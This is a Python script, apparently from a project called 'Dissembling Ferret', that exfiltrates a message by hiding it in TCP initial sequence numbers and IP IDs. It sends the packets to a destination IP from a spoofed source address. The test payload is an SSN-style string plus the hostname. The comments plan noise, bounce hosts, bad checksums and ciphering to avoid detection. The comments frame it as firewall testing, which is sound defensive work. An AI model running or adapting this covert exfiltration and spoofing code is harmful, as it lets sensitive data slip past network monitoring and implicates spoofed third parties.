#!/usr/bin/env python

'''
=======================================================================
  ___  _                  _    _ _             ___                _
 |   \(_)______ ___ _ __ | |__| (_)_ _  __ _  | __|__ _ _ _ _ ___| |_
 | |) | (_-<_-</ -_) '  \| '_ \ | | ' \/ _` | | _/ -_) '_| '_/ -_)  _|
 |___/|_/__/__/\___|_|_|_|_.__/_|_|_||_\__, | |_|\___|_| |_| \___|\__|
                                       |___/

=======================================================================

Send a message using TCP sequence numbers, ttl, window size, and perhaps
others. Inject noise into the channel to confuse eavesdroppers.

Sequence numbers have a generous size limit of 32bits.

Stego part:

The sequence numbers are converted to ASCII by dividing by 16777216 which is a
representation of 65536*256. [1] see README

TODO:
- change end-of-message indicator, win=1337
- add try, except where appropriate
- add mode [demo, live]
  demo mode will send packets immediately
  live mode will send 1 packet per second 3 times, once a minute (adjustable)???
- add bounce functionality
  i.e. bounce SYN packet off an active web server check ACK seq number
- Add dummy packet data to mimic real traffic. (should we bother?)
- Add TODOs to the issue queue on github.
- Add more tests, other than convert TCP/IP channels
- Send bad checksums (could help prevent responses to our SYN packets)
- Add a test that sends data in the data section of a packet
  - send '111223333' in one packet
  - send other messages as well, will any get flagged/blocked?

Questions:
- Why not bounce off DNS server(s) ?
- Should we cipher the seq numbers we generate in order to add a layer of
  obfuscation? So if the traffic is detected it won't be easily translated.

Notes:
A testing suite should be able to perform all tests or individual tests.
Lets start out by building the initial tests we are interested in and then run
through them all. I'll add this info to the issue queue. - Clay

Using ttl on the server side to determine how to decipher the message.
'''

# =======
# Imports
# =======

from scapy.all import *
import os
import sys
import random
import netifaces
import re
import time

# Custom function definitions
from lib import initialSeqFerret
from lib import ipidFerret

import IPy
from optparse import OptionParser

# Use OptionParser just to make the interface and feedback nice
parser = OptionParser()
parser.add_option ("-d", "--dest", dest="destination_ip", default="foo",
                    help="Destination IP for the hidden message")
parser.add_option ("-s", "--spoof", dest="spoof_ip", default="66.249.66.1",
                    help="Spoof the source IP address as this value")
parser.add_option ("-p", "--port", dest="dstport", default="80",
                    help="Destination port (port for Dissembling Ferret server listener)")
parser.add_option ("-m", "--mode", dest="mode", default="demo",
                    help="Demo or live mode - send packets slowly or immediately")
(options, args) = parser.parse_args()

destination = options.destination_ip
spoof = options.spoof_ip
dstport = int(options.dstport)
mode = options.mode

# Validate all the user input

# Ensure we have a destination specified
if destination == "foo":
    parser.print_help()
    exit(0)

try:
    IPy.IP(destination)
except ValueError:
    print "\nERROR: Invalid destination IP address\n"
    parser.print_help()
    exit(0)

try:
    IPy.IP(spoof)
except ValueError:
    print "\nERROR: Invalid spoof source IP address\n"
    parser.print_help()
    exit(0)

if dstport < 0 or dstport > 65535:
    print "\nERROR: Destination port number is invalid, try a number 0 to 65,535\n"
    parser.print_help()
    exit(0)

while mode != 'demo' and mode != 'live':
	mode = raw_input("Use a valid mode (live/demo):")


thishost = os.uname()[1]

# An example sending a SSN, with the hyphens to make it look like a SSN. A
# smooth criminal may try to obfuscate the SSN.
# TEST: will a firewall detect this? should it?
#message = '111-22-3333 from ' + thishost + '\n'
# TODO: Get this input from CLI or a file
message = 'foo bar 111-22-3333' + ' from ' + thishost


# ============
# Main program
# ============

print '[+] destination: ' + destination

# ==== use iseq
print '[*] Testing method Initial Sequence..'
initialSeqFerret.exfil_iseq(spoof, destination, dstport, message)
print '[*] Sent using iseq: %s' % message


# ==== use IPID
print '[*] Testing method IPID..'
ipidFerret.exfil_ipid(spoof, destination, dstport, message)
print '[*] Sent using IPID: %s' % message

# exfilArray = []
# ====


# ==== use bounce host
